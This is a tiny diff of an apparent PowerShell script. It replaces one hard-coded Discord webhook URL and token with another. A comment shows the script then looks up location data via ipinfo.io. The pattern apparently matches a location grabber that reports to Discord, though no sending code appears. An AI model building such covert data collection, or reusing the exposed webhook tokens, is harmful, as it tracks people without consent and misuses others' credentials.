@@ -1,5 +1,5 @@
 # Define the Discord webhook URL
-$webhookUrl = "https://discord.com/api/webhooks/1307484158192390165/Fj0EjVersk-B9aqImHM-ZvVeF3UNvRIUavceJVJmx2uxCO2qJTV4kB93vJj8jBPheAVt"
+$webhookUrl = "https://discord.com/api/webhooks/1326525228502745129/B-uNPC1wnfWS4Rv4dmL2Yhk7iTFKXQ02qO8cWWTD3cUWChJygkpKbmNVv_tPFKssMPEc"
 
 # Get location data using ipinfo.io
 try {
